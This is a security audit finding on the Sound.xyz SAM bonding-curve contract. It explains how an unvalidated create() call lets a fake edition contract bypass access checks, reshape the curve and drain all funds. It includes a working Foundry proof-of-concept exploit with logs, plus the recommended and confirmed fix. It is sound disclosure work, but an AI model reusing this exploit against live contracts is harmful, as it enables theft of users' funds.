---
tags:
  - lang/solidity
  - platform/zachobront
  - has/github
  - severity/high
  - sector/dex
  - sector/launchpad
protocol: "[[Sound.Xyz]]"
auditors:
  - "[[Zach Obront]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-01-Sound.xyz.md"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
  - "[[fot-slippage]]"
---
# [H-01] All funds can be stolen from the SAM contract

- id: 18723
- impact: HIGH
- protocol: [[Sound.Xyz]]
- reporter: Zach Obront (ZachObront)
- source: https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-01-Sound.xyz.md

## Summary


A bug was found in the `create()` function of the SAM contracts, which allows malicious contracts to be added to the system and bypass the `onlyEditionOwnerOrAdmin` and `onlyBeforeMintConcluded` checks. This enables the exploiter to set all parameters at any time, allowing them to add their contract as an edition with a very low inflection price, increasing data.supply arbitrarily at no cost, adjust the inflection price and point so that the curve shifts, increasing token price, and sell their tokens back into the curve for more than was ever put in, emptying funds from the SAM contract.

To validate this attack, a drop in test was added to the test file. The results of the test showed that the exploiter's balance increased and the SAM balance decreased.

To prevent this attack from happening, it is recommended that the logic that stops a user from adjusting a bonding curve comes from a trusted source. This can be implemented in many possible ways, such as locally storing a value that locks curve changes or validating the codehash of the edition.

The bug was fixed by editing the `onlyBeforeMintConcluded` modifier to include checking a `data.hasSold` flag, which is set when the first SAM sale takes place. This stops the attack by not allowing any curve parameters to be manipulated once any sales are made on the bonding curve.

## Details

The `create()` function doesn't validate that new editions added to the SAM contracts are, in fact, editions.

A malicious contract can be added that always passes the `onlyEditionOwnerOrAdmin` and `onlyBeforeMintConcluded` checks, which allows the exploiter to set all parameters at any time.

A user can therefore:

- Add their contract as an edition with a very low inflection price, increasing data.supply arbitrarily at ~ no cost
- Adjust the inflection price and point so that the curve shifts, increasing token price
- Sell their tokens back into the curve for more than was ever put in, emptying funds from the SAM contract

**Proof of Concept**

Here is a drop in test that can be added to the test file to validate this attack:

```solidity
pragma solidity ^0.8.16;

import { SAM } from "@modules/SAM.sol";
import "forge-std/Test.sol";

contract EvilEdition {
address public owner;

constructor() {
owner = msg.sender;
}

function mintConcluded() public view returns (bool) {
return false;
}

function samMint(address to, uint quantity) public returns (uint) {
return 1;
}

function samBurn(address from, uint[] memory tokenIds) public {}
}

contract SAMTests is Test {
SAM sam;
EvilEdition edition;
address exploiter = makeAddr("exploiter");

function testZach__BigEvilExploit() public {
vm.startPrank(exploiter);
vm.deal(exploiter, 1);

sam = new SAM();
edition = new EvilEdition();
vm.deal(address(sam), 1000 ether);
console.log("Starting Exploiter Balance:", exploiter.balance);
console.log("Starting SAM Balance:", address(sam).balance);

sam.create(
address(edition),
0, // base
1, // infl price
type(uint32).max, // infl point
1000, 0, 0 // artist, golden egg, affiliate
);

bytes32[] memory affProof = new bytes32[](0);
sam.buy{value: 1}(
address(edition),
exploiter,
1,
address(0),
affProof
);

sam.setInflectionPrice(address(edition), 500 ether);
sam.setInflectionPoint(address(edition), 1);

uint[] memory tokenIds = new uint[](1);
tokenIds[0] = 1;
sam.sell(
address(edition),
tokenIds,
1 ether,
exploiter
);

console.log("Ending Exploiter Balance:", exploiter.balance);
console.log("Ending SAM Balance:", address(sam).balance);

}
}
```

```solidity
Logs:
Starting Exploiter Balance: 1
Starting SAM Balance: 1000000000000000000000
Ending Exploiter Balance: 1000000000000000000001
Ending SAM Balance: 0
```

**Recommendations**

It's crucial that the logic that stops a user from adjusting a bonding curve comes from a trusted source. This can be implemented in many possible ways: locally storing a value (like the `data.supply` value or a boolean flag) that locks curve changes or validating the codehash of the edition.

**Review**

The `onlyBeforeMintConcluded` modifier was edited to include checking a `data.hasSold` flag, which is set when the first SAM sale takes place. The result is that no curve parameters can be manipulated once any sales are made on the bonding curve, which stops this attack.

Confirmed in commit [cf9f6bd3e59d41ed60f654fa3efe28d0fcbfaea5](https://github.com/soundxyz/sound-protocol-private/commit/cf9f6bd3e59d41ed60f654fa3efe28d0fcbfaea5).
